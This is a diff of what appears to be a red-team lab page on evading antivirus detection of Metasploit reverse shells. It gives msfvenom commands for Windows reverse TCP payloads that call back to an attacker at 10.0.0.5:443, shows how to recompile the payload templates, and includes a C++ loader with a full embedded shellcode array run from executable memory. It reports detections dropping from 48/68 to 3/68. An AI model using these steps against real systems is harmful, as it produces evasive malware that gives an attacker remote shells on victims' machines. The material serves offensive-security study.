@@ -1,8 +1,10 @@
-# AV Bypass with Metasploit Templates
+# AV Bypass with Metasploit Templates and Custom Compiled Binaries
+
+This is a quick look of a couple of simple ways to **attempt** to bypass antivirus for metasploits reverse shells.
 
 ## 48/68 detections
 
-Generating a standard MSF payload file:
+For a baseline test, let's generate the standard MSF reverse shell payload for a 32 bit Windows system:
 
 ```text
 root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
@@ -13,23 +15,23 @@ Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 ```
 
-Checking the file in [VirusTotal](https://www.virustotal.com/#/file/ebf62a6140591b6ccf81035a7f06b3a6580144cfa5a9de0ad49dd323c4513ee3/detection):
+Checking the file in [VirusTotal](https://www.virustotal.com/#/file/ebf62a6140591b6ccf81035a7f06b3a6580144cfa5a9de0ad49dd323c4513ee3/detection) gives the following detection rate:
 
 ![](../.gitbook/assets/msf-templates-default-payload.png)
 
 ## 36/68 detections
 
-The exe binary that was generated earlier used the below source code to generate the host binary that gets injected with the shellcode of our choice:
+When generating metasploit payloads, our specified shellcode gets injected into the template binaries. Our payload got injected into the template for which the source code is provided below:
 
 ![](../.gitbook/assets/msf-template.png)
 
-Recompile the standard template
+Out of curiosity, let's simply recompile the standard template:
 
 ```text
 root@/usr/share/metasploit-framework/data/templates/src/pe/exe# i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe
 ```
 
-Regenerate the payload with a new template:
+..and regenerate the payload using the new template:
 
 ```text
 root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypass.exe -f exe > /root/tools/avbypass.exe
@@ -40,7 +42,7 @@ Payload size: 324 bytes
 Final size of exe file: 363382 bytes
 ```
 
-Detections dropped from 48 to 36 for only recompiling the binary template and not making any changes to it \([VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection)\):
+[VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection) detections dropped from 48 to 36 and that did not require any code change!
 
 ![](../.gitbook/assets/msf-template-vt2.png)
 
@@ -50,15 +52,67 @@ If we make a couple of small changes to the code for memory allocation sizes:
 
 ![](../.gitbook/assets/msf-template-sizes.png)
 
-[VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections drop from 36 to 32:
+We can further reduce [VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections - this time they drop from 36 to 32:
 
 ![](../.gitbook/assets/msf-template-vt3.png)
 
-That is not bad, but could be so much better.
 
-## 3/68 detections - custom binary
+
+## 8/68 detections - custom x86 binary
 
 Let's do something a bit more custom - build a binary from the previous lab [CreateRemoteThread Shellcode Injection](t1055-process-injection/process-injection.md) that is based on the payload: 
+
+{% code-tabs %}
+{% code-tabs-item title="inject-local-process.cpp" %}
+```cpp
+#include "stdafx.h"
+#include "Windows.h"
+
+int main()
+{
+	unsigned char shellcode[] =
+		"\xbd\x85\x3b\x76\xa3\xda\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
+		"\x52\x31\x6b\x12\x83\xeb\xfc\x03\xee\x35\x94\x56\x0c\xa1\xda"
+		"\x99\xec\x32\xbb\x10\x09\x03\xfb\x47\x5a\x34\xcb\x0c\x0e\xb9"
+		"\xa0\x41\xba\x4a\xc4\x4d\xcd\xfb\x63\xa8\xe0\xfc\xd8\x88\x63"
+		"\x7f\x23\xdd\x43\xbe\xec\x10\x82\x87\x11\xd8\xd6\x50\x5d\x4f"
+		"\xc6\xd5\x2b\x4c\x6d\xa5\xba\xd4\x92\x7e\xbc\xf5\x05\xf4\xe7"
+		"\xd5\xa4\xd9\x93\x5f\xbe\x3e\x99\x16\x35\xf4\x55\xa9\x9f\xc4"
+		"\x96\x06\xde\xe8\x64\x56\x27\xce\x96\x2d\x51\x2c\x2a\x36\xa6"
+		"\x4e\xf0\xb3\x3c\xe8\x73\x63\x98\x08\x57\xf2\x6b\x06\x1c\x70"
+		"\x33\x0b\xa3\x55\x48\x37\x28\x58\x9e\xb1\x6a\x7f\x3a\x99\x29"
+		"\x1e\x1b\x47\x9f\x1f\x7b\x28\x40\xba\xf0\xc5\x95\xb7\x5b\x82"
+		"\x5a\xfa\x63\x52\xf5\x8d\x10\x60\x5a\x26\xbe\xc8\x13\xe0\x39"
+		"\x2e\x0e\x54\xd5\xd1\xb1\xa5\xfc\x15\xe5\xf5\x96\xbc\x86\x9d"
+		"\x66\x40\x53\x31\x36\xee\x0c\xf2\xe6\x4e\xfd\x9a\xec\x40\x22"
+		"\xba\x0f\x8b\x4b\x51\xea\x5c\x7e\xa6\xf4\x99\x16\xa4\xf4\xa0"
+		"\x5d\x21\x12\xc8\xb1\x64\x8d\x65\x2b\x2d\x45\x17\xb4\xfb\x20"
+		"\x17\x3e\x08\xd5\xd6\xb7\x65\xc5\x8f\x37\x30\xb7\x06\x47\xee"
+		"\xdf\xc5\xda\x75\x1f\x83\xc6\x21\x48\xc4\x39\x38\x1c\xf8\x60"
+		"\x92\x02\x01\xf4\xdd\x86\xde\xc5\xe0\x07\x92\x72\xc7\x17\x6a"
+		"\x7a\x43\x43\x22\x2d\x1d\x3d\x84\x87\xef\x97\x5e\x7b\xa6\x7f"
+		"\x26\xb7\x79\xf9\x27\x92\x0f\xe5\x96\x4b\x56\x1a\x16\x1c\x5e"
+		"\x63\x4a\xbc\xa1\xbe\xce\xcc\xeb\xe2\x67\x45\xb2\x77\x3a\x08"
+		"\x45\xa2\x79\x35\xc6\x46\x02\xc2\xd6\x23\x07\x8e\x50\xd8\x75"
+		"\x9f\x34\xde\x2a\xa0\x1c";
+
+	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, shellcode, sizeof shellcode);
+	((void(*)())exec)();
+
+    return 0;
+}
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+[VirusTotal](https://www.virustotal.com/#/file/f4dfceb473a878a3751513bacb4d44ee460391ce1a668edb5337d4859e767335/detection) detections dropped dramatically to 8/68:
+
+![](../.gitbook/assets/msf-vt5.png)
+
+## 3/68 detections - custom x64 binary
+
+The above binaries were all for a x86 architecture. Let's try generating the shellcode for a x64 system and use the same custom binary:
 
 ```csharp
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
@@ -118,9 +172,9 @@ int main()
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-[VirusTotal](https://www.virustotal.com/#/file/d1431f479724822d6ccf8684a99598d966a9b5a964e7bd3886308a0217dea712/detection) now only shows 3/68 detections, which is a great improvement that enables us bypassing most of the popular antivirus vendors:
+[VirusTotal](https://www.virustotal.com/#/file/d1431f479724822d6ccf8684a99598d966a9b5a964e7bd3886308a0217dea712/detection) now only shows **3/68** detections, which is a great improvement that enables us bypassing most of the popular antivirus vendors:
 
 ![](../.gitbook/assets/msf-vt4.png)
 
-
+{% embed data="{\"url\":\"https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/\",\"type\":\"link\",\"title\":\"Backdooring EXE Files\",\"description\":\"The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. The best part about it is its extremely simple.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.offensive-security.com/favicon.ico\",\"aspectRatio\":0}}" %}
 
